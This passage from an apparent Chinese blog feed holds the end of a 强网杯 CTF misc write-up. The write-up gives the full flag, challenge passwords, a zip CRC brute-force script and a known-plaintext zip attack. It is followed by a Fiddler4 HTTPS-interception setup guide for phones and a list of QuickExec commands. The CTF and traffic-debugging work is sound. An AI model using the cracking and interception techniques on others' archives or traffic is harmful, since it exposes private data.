c52c413417f78c3d831a75ffd34dccd3c434ede3cd456f1fe25f8cebc301e502 8e8da12784192f2aa70b4e4ca5f832836f0fdedcc2cc32f11bff2522dcb7cbcd</span><br><span class="line">CLIENT_RANDOM ba069d4ce442f60d87deb17d1a0632be516c76c4061a1e241597601220f12ee9 1f9f13ee505e3310b3b4ce3c43254e55906aed5f876179e45ad2904931f1e5ce2c943534fc4700082c7db79652b9fd57</span><br><span class="line">CLIENT_HANDSHAKE_TRAFFIC_SECRET e9f981e3b3cfe26377db3e666afd10b15f03025e2488bda2bf58ea1d2bce45fb 6c5786721b2605d8dee0fa489367c2e21f10b71dd14eef8862fc056bbf2d4ec9</span><br><span class="line">SERVER_HANDSHAKE_TRAFFIC_SECRET e9f981e3b3cfe26377db3e666afd10b15f03025e2488bda2bf58ea1d2bce45fb faf948ebf0c01bc140a0d222f8149a82fec2b1637b3d5bda5e5517b4585912c8</span><br><span class="line">CLIENT_HANDSHAKE_TRAFFIC_SECRET f52dbb843bb7035d499c5b234e7615506decebf1b209762dd93a5ac64d9e49eb 93f07c90d8e7827e945dc46e384420f808d9f78297a97d6279a6b9c52dcbf2c8</span><br><span class="line">SERVER_HANDSHAKE_TRAFFIC_SECRET f52dbb843bb7035d499c5b234e7615506decebf1b209762dd93a5ac64d9e49eb 8d04cc7aa472ab4c803f9e6ae62322a8646b37f7019baf21c825826008e1d19a</span><br><span class="line">CLIENT_TRAFFIC_SECRET_0 e9f981e3b3cfe26377db3e666afd10b15f03025e2488bda2bf58ea1d2bce45fb f252e57801505de1828ae5d6cbf83b05828caf4d895f1ba7e68028cc6d0c971b</span><br><span class="line">SERVER_TRAFFIC_SECRET_0 e9f981e3b3cfe26377db3e666afd10b15f03025e2488bda2bf58ea1d2bce45fb 212bf4eb937a63e90fc1a75440eec00dc017c593069afc7c2bc789f2be65f98f</span><br><span class="line">EXPORTER_SECRET e9f981e3b3cfe26377db3e666afd10b15f03025e2488bda2bf58ea1d2bce45fb 545be75716228b35e8602c2264502f86c94acf2d0d858e0be85291589e251b63</span><br><span class="line">CLIENT_TRAFFIC_SECRET_0 f52dbb843bb7035d499c5b234e7615506decebf1b209762dd93a5ac64d9e49eb d701e889f960d49d6c02f36c42dcb07517f3e002198308d5ce9dcd32ef32d6c3</span><br><span class="line">SERVER_TRAFFIC_SECRET_0 f52dbb843bb7035d499c5b234e7615506decebf1b209762dd93a5ac64d9e49eb d0dadca29ed47adc2b7e49f254fc391f1a5ec2b6465befb55a2c5c322c77121d</span><br><span class="line">EXPORTER_SECRET f52dbb843bb7035d499c5b234e7615506decebf1b209762dd93a5ac64d9e49eb a03de9d1728cfe4d587e8bdf6eb5abd43b9bb23784c6044983ba706692e949f4</span><br><span class="line">CLIENT_RANDOM 97aea926d6fb1ba42e9ce6930d8f9c35dc13b879492fef88a2ee6d7ed3d8c3fe 1f9f13ee505e3310b3b4ce3c43254e55906aed5f876179e45ad2904931f1e5ce2c943534fc4700082c7db79652b9fd57</span><br><span class="line">CLIENT_RANDOM e56fcafef341dd4cf008c404792e7da7f7aebb84f73636d55768614561e72f29 1f9f13ee505e3310b3b4ce3c43254e55906aed5f876179e45ad2904931f1e5ce2c943534fc4700082c7db79652b9fd57</span><br><span class="line">CLIENT_RANDOM b24763c3f62e0af76ca7b6be43ba2788d900ac9170559c5fb56f9f831b5ee7d2 1f9f13ee505e3310b3b4ce3c43254e55906aed5f876179e45ad2904931f1e5ce2c943534fc4700082c7db79652b9fd57</span><br><span class="line">CLIENT_HANDSHAKE_TRAFFIC_SECRET d06c95c8b7e6ffbe3293cb652d097b31768c821fc25c7166f09e2e620c2d213e 096619f19789013c79f67362ce825747a7919464da61ce298b64d7135f9828d4</span><br><span class="line">SERVER_HANDSHAKE_TRAFFIC_SECRET d06c95c8b7e6ffbe3293cb652d097b31768c821fc25c7166f09e2e620c2d213e 88ddbd37dc096ea3f3c8258414607d7084cb04b00719231e08afc9b0e8bb657b</span><br><span class="line">CLIENT_TRAFFIC_SECRET_0 d06c95c8b7e6ffbe3293cb652d097b31768c821fc25c7166f09e2e620c2d213e 8548a64e18bec1569bb870417a94901a0a145a3e5b27397bdcd49227faa81626</span><br><span class="line">SERVER_TRAFFIC_SECRET_0 d06c95c8b7e6ffbe3293cb652d097b31768c821fc25c7166f09e2e620c2d213e 674a1e1d8648353ba50f6f906ecabad65e6440c3e5592f25596e09cc04e045e6</span><br><span class="line">EXPORTER_SECRET d06c95c8b7e6ffbe3293cb652d097b31768c821fc25c7166f09e2e620c2d213e 85b68b6e8e5041fbb171319cc1c108a2a66fc4b47907fb5a99669be0db7fa3f3</span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{level1_begin_and_level2_is_come</p>
</blockquote>
<h4 id="part2"><a href="#part2" class="headerlink" title="part2"></a>part2</h4><p>zsteg 提出图片中隐藏的文本，导入CyberChef，base64解密得到一系列的01字符和第二部分的flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure>

<blockquote>
<p>level3_start_it</p>
</blockquote>
<h4 id="part3"><a href="#part3" class="headerlink" title="part3"></a>part3</h4><p>根据01字符串长度3600，猜测是60*60的矩阵构成的二维码，编写脚本生成二维码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">map = <span class="stringspan></span><br><span class="line">img = Image.new(<span class="string">'RGB'</span>, (<span class="number">600</span>, <span class="number">600</span>), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">block = Image.new(<span class="string">'RGB'</span>, (<span class="number">10</span>, <span class="number">10</span>), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">60</span>):</span><br><span class="line">        n = i*<span class="number">60</span>+j</span><br><span class="line">        x = i*<span class="number">10</span></span><br><span class="line">        y = j*<span class="number">10</span></span><br><span class="line">        <span class="keyword">if</span> map[n] == <span class="string">'1'</span>:</span><br><span class="line">            img.paste(block, (x, y))</span><br><span class="line">img.show()</span><br><span class="line">img.save(<span class="string">"code.png"</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/08/28/KgcdWkaZHyj7PnV.png" alt="image-20200828114525248.png"></p>
<p>扫码得到百度云链接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1wVJ7d0RLW8Rj-HOTL9Shug</span><br><span class="line">提取码：1lms</span><br></pre></td></tr></table></figure>

<p>下载得到level4.jpg</p>
<p>stegdetect检测出是jphide隐写，密码power123</p>
<p>得到另一个百度云链接和第三部分flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1o43y4UGkm1eP-RViC25aOw</span><br><span class="line">mrpt</span><br><span class="line"></span><br><span class="line">level4_here_all</span><br></pre></td></tr></table></figure>

<blockquote>
<p>level4_here_all</p>
</blockquote>
<h4 id="part4"><a href="#part4" class="headerlink" title="part4"></a>part4</h4><p>下载得到level5.zip</p>
<p>解压得到一堆东西，其中一张图片写着第四部分flag</p>
<p><img src="https://i.loli.net/2020/08/28/NQ3tuyXfSUCBK8J.png" alt="image-20200828120116649.png"></p>
<blockquote>
<p>level5_is_aaa</p>
</blockquote>
<h4 id="part5"><a href="#part5" class="headerlink" title="part5"></a>part5</h4><p>打开level6.zip，是个加密压缩包，里面有三个txt，大小是4或5，可以利用CRC爆破出其中的内容</p>
<p>使用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2tteWsvemlwLWNyYy1jcmFja2Vy6ISa5pys77yM5bm25YGa5Ye655Wl5b6u55qE5L+u5pS5">https://github.com/kmyk/zip-crc-cracker脚本，并做出略微的修改<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">'file'</span>, nargs=<span class="string">'*'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--hex'</span>, action=<span class="string">'append'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--dec'</span>, action=<span class="string">'append'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--limit'</span>, type=int)</span><br><span class="line">parser.add_argument(<span class="string">'--compiler'</span>, default=<span class="string">'g++'</span>)</span><br><span class="line"><span class="comment">#parser.add_argument('--alphabet', type=os.fsencode, default=string.printable.encode())</span></span><br><span class="line">parser.add_argument(<span class="string">'--alphabet'</span>, type=os.fsencode, default=<span class="string">b'0123456789abcdefghijklmnopqrstuvwxyz_-ABCEDFGHIJKLMNOPQRSTUVWXYZ'</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">targets = collections.OrderedDict()</span><br><span class="line">limit = <span class="number">0</span></span><br><span class="line">crcs = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.limit:</span><br><span class="line">    limit = max(limit, args.limit)</span><br><span class="line"><span class="keyword">if</span> args.hex <span class="keyword">or</span> args.dec:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.limit:</span><br><span class="line">        parser.error(<span class="string">'Limit of length not specified'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.hex:</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> args.hex:</span><br><span class="line">        crc = int(s, <span class="number">16</span>)</span><br><span class="line">        targets[s] = crc</span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> range(args.limit + <span class="number">1</span>):</span><br><span class="line">            crcs += [( crc, l )]</span><br><span class="line"><span class="keyword">if</span> args.dec:</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> args.dec:</span><br><span class="line">        crc = int(s)</span><br><span class="line">        targets[s] = crc</span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> range(args.limit + <span class="number">1</span>):</span><br><span class="line">            crcs += [( crc, l )]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.file:</span><br><span class="line">    print(<span class="string">'reading zip files...'</span>, file=sys.stderr)</span><br><span class="line">    <span class="keyword">import</span> zipfile</span><br><span class="line">    <span class="keyword">for</span> zipname <span class="keyword">in</span> args.file:</span><br><span class="line">        fh = zipfile.ZipFile(zipname)</span><br><span class="line">        <span class="keyword">for</span> info <span class="keyword">in</span> fh.infolist():</span><br><span class="line">            targets[<span class="string">'%s / %s'</span> % ( zipname, info.filename )] = ( info.CRC, info.file_size )</span><br><span class="line">            crcs += [( info.CRC, info.file_size )]</span><br><span class="line">            limit = max(limit, info.file_size)</span><br><span class="line">            print(<span class="string">'file found: %s / %s: crc = 0x%08x, size = %d'</span> % (zipname, info.filename, info.CRC, info.file_size), file=sys.stderr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> crcs:</span><br><span class="line">    parser.error(<span class="string">'No CRCs given'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># compiling c++ in python script is the easy way to have the both a good interface and better speed</span></span><br><span class="line">code = <span class="string">''</span></span><br><span class="line">code += <span class="string">r'''</span></span><br><span class="line"><span class="string">#include &lt;cstdio&gt;</span></span><br><span class="line"><span class="string">#include &lt;vector&gt;</span></span><br><span class="line"><span class="string">#include &lt;array&gt;</span></span><br><span class="line"><span class="string">#include &lt;string&gt;</span></span><br><span class="line"><span class="string">#include &lt;set&gt;</span></span><br><span class="line"><span class="string">#include &lt;cstdint&gt;</span></span><br><span class="line"><span class="string">#include &lt;cctype&gt;</span></span><br><span class="line"><span class="string">#define repeat(i,n) for (int i = 0; (i) &lt; (n); ++(i))</span></span><br><span class="line"><span class="string">using namespace std;</span></span><br><span class="line"><span class="string">uint32_t crc_table[256];</span></span><br><span class="line"><span class="string">void make_crc_table() &#123;</span></span><br><span class="line"><span class="string">    repeat (i, 256) &#123;</span></span><br><span class="line"><span class="string">        uint32_t c = i;</span></span><br><span class="line"><span class="string">        repeat (j, 8) &#123;</span></span><br><span class="line"><span class="string">            c = (c &amp; 1) ? (0xedb88320 ^ (c &gt;&gt; 1)) : (c &gt;&gt; 1);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        crc_table[i] = c;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">const uint32_t initial_crc32 = 0xffffffff;</span></span><br><span class="line"><span class="string">uint32_t next_crc32(uint32_t c, char b) &#123;</span></span><br><span class="line"><span class="string">    return crc_table[(c ^ b) &amp; 0xff] ^ (c &gt;&gt; 8);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">const uint32_t mask_crc32 = 0xffffffff;</span></span><br><span class="line"><span class="string">const char alphabet[] = &#123; '''</span> + <span class="string">', '</span>.join(map(str, args.alphabet)) + <span class="string">r''' &#125;;</span></span><br><span class="line"><span class="string">const int limit = '''</span> + str(limit) + <span class="string">r''';</span></span><br><span class="line"><span class="string">array&lt;set&lt;uint32_t&gt;, limit+1&gt; crcs;</span></span><br><span class="line"><span class="string">string stk;</span></span><br><span class="line"><span class="string">void dfs(uint32_t crc) &#123;</span></span><br><span class="line"><span class="string">    if (crcs[stk.length()].count(crc ^ mask_crc32)) &#123;</span></span><br><span class="line"><span class="string">        fprintf(stderr, "crc found: 0x%08x: \"", crc ^ mask_crc32);</span></span><br><span class="line"><span class="string">        for (char c : stk) fprintf(stderr, isprint(c) &amp;&amp; (c != '\\') ? "%c" : "\\x%02x", c);</span></span><br><span class="line"><span class="string">        fprintf(stderr, "\"\n");</span></span><br><span class="line"><span class="string">        printf("%08x ", crc ^ mask_crc32);</span></span><br><span class="line"><span class="string">        for (char c : stk) printf(" %02x", c);</span></span><br><span class="line"><span class="string">        printf("\n");</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    if (stk.length() &lt; limit) &#123;</span></span><br><span class="line"><span class="string">        for (char c : alphabet) &#123;</span></span><br><span class="line"><span class="string">            stk.push_back(c);</span></span><br><span class="line"><span class="string">            dfs(next_crc32(crc, c));</span></span><br><span class="line"><span class="string">            stk.pop_back();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">int main() &#123;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">for</span> crc, size <span class="keyword">in</span> crcs:</span><br><span class="line">    code += <span class="string">'    crcs['</span> + str(size) + <span class="string">'].insert('</span> + hex(crc) + <span class="string">');\n'</span></span><br><span class="line">code += <span class="string">r'''</span></span><br><span class="line"><span class="string">    make_crc_table();</span></span><br><span class="line"><span class="string">    dfs(initial_crc32);</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">with</span> tempfile.TemporaryDirectory() <span class="keyword">as</span> tmpdir:</span><br><span class="line">    cppname = os.path.join(tmpdir, <span class="string">'a.cpp'</span>)</span><br><span class="line">    <span class="keyword">with</span> open(cppname, <span class="string">'w'</span>) <span class="keyword">as</span> fh:</span><br><span class="line">        fh.write(code)</span><br><span class="line">    binname = os.path.join(tmpdir, <span class="string">'a.out'</span>)</span><br><span class="line">    print(<span class="string">'compiling...'</span>, file=sys.stderr)</span><br><span class="line">    p = subprocess.check_call([args.compiler, <span class="string">'-std=c++11'</span>, <span class="string">'-O3'</span>, <span class="string">'-o'</span>, binname, cppname])</span><br><span class="line">    print(<span class="string">'searching...'</span>, file=sys.stderr)</span><br><span class="line">    p = subprocess.Popen([binname], stdout=subprocess.PIPE)</span><br><span class="line">    output, _ = p.communicate()</span><br><span class="line"></span><br><span class="line">print(<span class="string">'done'</span>, file=sys.stderr)</span><br><span class="line">print(file=sys.stderr)</span><br><span class="line">result = collections.defaultdict(list)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> output.decode().strip().split(<span class="string">'\n'</span>):</span><br><span class="line">    crc, *val = map(<span class="keyword">lambda</span> x: int(x, <span class="number">16</span>), line.split())</span><br><span class="line">    result[( crc, len(val) )] += [ bytes(val) ]</span><br><span class="line"><span class="keyword">for</span> key, crc <span class="keyword">in</span> targets.items():</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> result[crc]:</span><br><span class="line">        print(<span class="string">'%s : %s'</span> % (key, repr(s)[<span class="number">1</span>:]))</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/08/28/izpmCJ8AcSshkYj.png" alt="image-20200828120527297.png"></p>
<p>很快就爆破出了文本内容</p>
<blockquote>
<p>level6_isready</p>
</blockquote>
<h4 id="part6"><a href="#part6" class="headerlink" title="part6"></a>part6</h4><p>打开level7.zip，里面有1.png，4.png，5.png三个加密文件</p>
<p>可以发现level5压缩包内也有一个1.png，并且大小与level7里的一致，可利用明文攻击得到解密后的压缩包</p>
<p>4.png、5.png是盲水印，解密得到第六部分的flag和第七部分的网址</p>
<p><img src="https://i.loli.net/2020/08/28/wtXYi8VJA2xIl9d.png" alt="image-20200828120857112.png"></p>
<p><span class="exturl" data-url="aHR0cDovLzM5Ljk5LjI0Ny4yOC9maW5hbF9sZXZlbA==">http://39.99.247.28/final_level<i class="fa fa-external-link-alt"></i></span></p>
<blockquote>
<p>level7ishere</p>
</blockquote>
<h4 id="part7"><a href="#part7" class="headerlink" title="part7"></a>part7</h4><p>打开最后一关的网址，发现是个百度的静态网页，将真百度也下载到本地，diff发现假百度的某些行后面有突兀的空格和制表符</p>
<p>假百度：</p>
<p><img src="https://i.loli.net/2020/08/28/cPXpvKomnHh6CbD.png" alt="image-20200828121207931.png"></p>
<p>真百度：</p>
<p><img src="https://i.loli.net/2020/08/28/Gqp4bZzMkK5csQv.png" alt="image-20200828121228980.png"></p>
<p>根据这一特性猜测是snow隐写</p>
<p>根据注释</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- How did it become a blank , maybe you should pass (no one can find me)--&gt;</span></span><br></pre></td></tr></table></figure>

<p>得知密码为<code>no one can find me</code></p>
<p>通过在线网站<span class="exturl" data-url="aHR0cDovL2ZvZy5taXN0eS5jb20vcGVycnkvY2NzL3Nub3cvc25vdy9zbm93Lmh0bWzop6Plr4blvpfliLBmbGFn">http://fog.misty.com/perry/ccs/snow/snow/snow.html解密得到flag<i class="fa fa-external-link-alt"></i></span></p>
<blockquote>
<p>the_misc_examaaaaaaa_!!!}</p>
</blockquote>
<p>全部拼起来就是</p>
<blockquote>
<p>flag{level1_begin_and_level2_is_comelevel3_start_itlevel4_here_alllevel5_is_aaalevel6_isread<br>ylevel7isherethe_misc_examaaaaaaa_!!!}</p>
</blockquote>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>writeup</tag>
        <tag>强网杯</tag>
      </tags>
  </entry>
  <entry>
    <title>Fiddler4配置指北</title>
    <url>/2020/09/05/Fiddler4%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="Fiddler4-是啥"><a href="#Fiddler4-是啥" class="headerlink" title="Fiddler4 是啥"></a>Fiddler4 是啥</h2><p>HTTP(s)网页抓包调试工具</p>
<p>官网：<span class="exturl" data-url="aHR0cDovL3d3dy50ZWxlcmlrLmNvbS9maWRkbGVyLw==">http://www.telerik.com/fiddler/<i class="fa fa-external-link-alt"></i></span></p>
<p>现在官网还出了个Fiddler Everywhere，但是功能上相比Fiddler 4有大量阉割，所以不建议现在使用。</p>
<p>文章最后附有相关下载地址</p>
<h2 id="本体安装"><a href="#本体安装" class="headerlink" title="本体安装"></a>本体安装</h2><p>这个大家应该都会，官网下载之后运行安装即可，但是先不急着打开</p>
<h2 id="证书生成器安装"><a href="#证书生成器安装" class="headerlink" title="证书生成器安装"></a>证书生成器安装</h2><p>因为本体自带的证书生成器可能会与Android/IOS不兼容，所以我们需要一个插件——CertMaker，这是官方的插件，去官网可以找到</p>
<p><img src="https://i.loli.net/2020/09/05/GBYtiQOun7robPN.png" alt="image-20200905210257840.png"></p>
<p>下载之后双击安装即可，会自动在Fiddler4的安装目录下生成CertMaker.dll文件</p>
<p>打开Fiddler4可以看到 Tools - Options - HTTPS这里已经变成了CertMaker</p>
<p><img src="https://i.loli.net/2020/09/05/XwMY8y9G4aFUWLZ.png" alt="image-20200905210509575.png"></p>
<p>如果前面已经打开了Fiddler4，重启Fiddler4即可。</p>
<h2 id="HTTPS证书安装"><a href="#HTTPS证书安装" class="headerlink" title="HTTPS证书安装"></a>HTTPS证书安装</h2><h3 id="Windows设置"><a href="#Windows设置" class="headerlink" title="Windows设置"></a>Windows设置</h3><p>默认情况下，Fiddler4没有开启HTTPS抓包</p>
<p>进入Tools - Options - HTTPS，进行如下设置</p>
<p><img src="https://i.loli.net/2020/09/05/hbtXfEamxJ7Gogj.png" alt="image-20200905210735221.png"></p>
<p>默认情况下会弹出证书安装的窗口，如果没有弹出或者证书有问题，选择 Actions - Reset All Certificates 重置并安装证书</p>
<p><img src="https://i.loli.net/2020/09/05/xifYF2bDHVS3wNs.png" alt="image-20200905210806110.png"></p>
<p>然后就可以抓到HTTPS的包了</p>
<h3 id="Android设置"><a href="#Android设置" class="headerlink" title="Android设置"></a>Android设置</h3><p>新版的Android无法信任用户凭证，所以首先需要已经root了的Android系统，保证与计算机处于同一局域网中，并且能够访问到计算机，这里我图方便，用的是MuMu模拟器。</p>
<p><code>如果不想用模拟器也不想root的话可以使用太极等免root的Xposed框架，具体可以查看别人的教程</code></p>
<p>首先在Fiddler里打开 Tools - Options - Connections，按如下设置，如果8888端口（默认）被占用，可设置为其它端口，这里我将它改成了7777端口。</p>
<p><img src="https://i.loli.net/2020/09/05/fU4q6ZntbueM2jH.png" alt="image-20200905211156987.png"></p>
<p>然后运行 - cmd - 输入ipconfig查看自己的ip地址</p>
<p><img src="https://i.loli.net/2020/09/05/cXzagqFD26Cho5j.png" alt="image-20200905212104221.png"></p>
<p>因为我的ip地址是<code>192.168.2.232</code>，端口设置为了<code>7777</code>所以在Android系统中打开 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMi4yMzI6Nzc3Nw==">http://192.168.2.232:7777<i class="fa fa-external-link-alt"></i></span> 网页</p>
<p><img src="https://i.loli.net/2020/09/05/pmPdDcy6jb4RXWv.png" alt="image-20200905212357233.png"></p>
<p>然后下载<code>FiddlerRoot certificate</code>，这个就是Fiddler的证书，下载完成后点开安装即可</p>
<p>然后在 设置 - 安全 - 信任的凭证 - 用户 里就可以看到Fiddler的证书</p>
<p><img src="https://i.loli.net/2020/09/05/HszhPDLFqblNkCW.png" alt="image-20200905212553029.png"></p>
<h3 id="IOS设置"><a href="#IOS设置" class="headerlink" title="IOS设置"></a>IOS设置</h3><p>IOS与Android基本类似，但是IOS不需要越狱，直接访问网址，点开下载证书，然后进入设置，<strong>安装描述文件</strong></p>
<p>但是安装完描述文件之后还并不能抓包，需要进入 设置 - 通用 - 关于本机 - 证书信任设置 中选择完全信任根证书。</p>
<h2 id="代理设置"><a href="#代理设置" class="headerlink" title="代理设置"></a>代理设置</h2><p>windows会自动设置系统代理，默认情况下浏览器也会跟随系统代理，但是IOS和Android需要设置代理服务器。</p>
<p>需要注意的是Fiddler的代理属于HTTP代理</p>
<h3 id="Android设置-1"><a href="#Android设置-1" class="headerlink" title="Android设置"></a>Android设置</h3><p>进入wifi设置页面，长按已连接的wifi，显示高级选项，设置手动代理，填入对应的主机名(ip)和端口即可。这里我是192.168.2.232和7777</p>
<h3 id="IOS设置-1"><a href="#IOS设置-1" class="headerlink" title="IOS设置"></a>IOS设置</h3><p>同样进入wifi设置页面，点击wifi右边的 <code>i</code> ，点击配置代理，然后和Android一样的操作即可。</p>
<p>代理配置完成之后，就可以愉快地抓包了</p>
<h2 id="相关下载地址"><a href="#相关下载地址" class="headerlink" title="相关下载地址"></a>相关下载地址</h2><p>Fiddler4本体：<span class="exturl" data-url="aHR0cDovL3d3dy50ZWxlcmlrLmNvbS9kb3dubG9hZC9maWRkbGVyL2ZpZGRsZXI0">http://www.telerik.com/download/fiddler/fiddler4<i class="fa fa-external-link-alt"></i></span></p>
<p>FiddlerCertMaker：<span class="exturl" data-url="aHR0cHM6Ly90ZWxlcmlrLWZpZGRsZXIuczMuYW1hem9uYXdzLmNvbS9maWRkbGVyL2FkZG9ucy9maWRkbGVyY2VydG1ha2VyLmV4ZQ==">https://telerik-fiddler.s3.amazonaws.com/fiddler/addons/fiddlercertmaker.exe<i class="fa fa-external-link-alt"></i></span></p>
<p>其它插件 Fiddler_add-ons：<span class="exturl" data-url="aHR0cHM6Ly93d3cudGVsZXJpay5jb20vZmlkZGxlci9hZGQtb25z">https://www.telerik.com/fiddler/add-ons<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>note</tag>
        <tag>Fiddler</tag>
        <tag>web</tag>
        <tag>抓包</tag>
      </tags>
  </entry>
  <entry>
    <title>Fiddler4 QuickExec</title>
    <url>/2020/09/05/Fiddler-quickexec/</url>
    <content><![CDATA[<h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><p><code>Alt</code> + <code>Q</code></p>
<h3 id="突出显示URL包含某文本的Sessions"><a href="#突出显示URL包含某文本的Sessions" class="headerlink" title="突出显示URL包含某文本的Sessions"></a>突出显示URL包含某文本的Sessions</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?searchtext</span><br></pre></td></tr></table></figure>

<h3 id="选择指定大小的Responses"><a href="#选择指定大小的Responses" class="headerlink" title="选择指定大小的Responses"></a>选择指定大小的Responses</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;40000  # Select responses over 40kb</span><br><span class="line">&lt;5k     # Select responses under 5kb</span><br></pre></td></tr></table></figure>

<h3 id="选择指定状态码的Responses或指定方法的Requests"><a href="#选择指定状态码的Responses或指定方法的Requests" class="headerlink" title="选择指定状态码的Responses或指定方法的Requests"></a>选择指定状态码的Responses或指定方法的Requests</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;301    # Select 301 redirect responses</span><br><span class="line">&#x3D;POST   # Select POST requests</span><br></pre></td></tr></table></figure>

<h3 id="选择指定Host的Sessions"><a href="#选择指定Host的Sessions" class="headerlink" title="选择指定Host的Sessions"></a>选择指定Host的Sessions</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@msn.com   # Select www.msn.com, login.msn.com, etc</span><br></pre></td></tr></table></figure>

<h3 id="将URL包含某文本的Sessions标记为粗体"><a href="#将URL包含某文本的Sessions标记为粗体" class="headerlink" title="将URL包含某文本的Sessions标记为粗体"></a>将URL包含某文本的Sessions标记为粗体</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bold &#x2F;bar.aspx</span><br><span class="line">bold       # Call with no parameter to clear</span><br></pre></td></tr></table></figure>

<h3 id="当URL包含某文本时产生响应前中断"><a href="#当URL包含某文本时产生响应前中断" class="headerlink" title="当URL包含某文本时产生响应前中断"></a>当URL包含某文本时产生响应前中断</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bpafter &#x2F;favicon.ico </span><br><span class="line">bpafter    # Call with no parameter to clear</span><br></pre></td></tr></table></figure>

<h3 id="当返回某状态码时产生响应前中断"><a href="#当返回某状态码时产生响应前中断" class="headerlink" title="当返回某状态码时产生响应前中断"></a>当返回某状态码时产生响应前中断</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bps 404</span><br><span class="line">bps        # Call with no parameter to clear</span><br></pre></td></tr></table></figure>

<h3 id="指定请求方法产生请求前中断"><a href="#指定请求方法产生请求前中断" class="headerlink" title="指定请求方法产生请求前中断"></a>指定请求方法产生请求前中断</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bpv POST</span><br><span class="line">bpv        # Call with no parameter to clear</span><br><span class="line">bpm POST</span><br><span class="line">bpm        # Call with no parameter to clear</span><br></pre></td></tr></table></figure>

<h3 id="当URL包含某文本时产生请求前中断"><a href="#当URL包含某文本时产生请求前中断" class="headerlink" title="当URL包含某文本时产生请求前中断"></a>当URL包含某文本时产生请求前中断</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bpu &#x2F;myservice.asmx</span><br><span class="line">bpu        # Call with no parameter to clear</span><br></pre></td></tr></table></figure>

<h3 id="清空所有sessions"><a href="#清空所有sessions" class="headerlink" title="清空所有sessions"></a>清空所有sessions</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cls</span><br><span class="line">clear</span><br></pre></td></tr></table></figure>

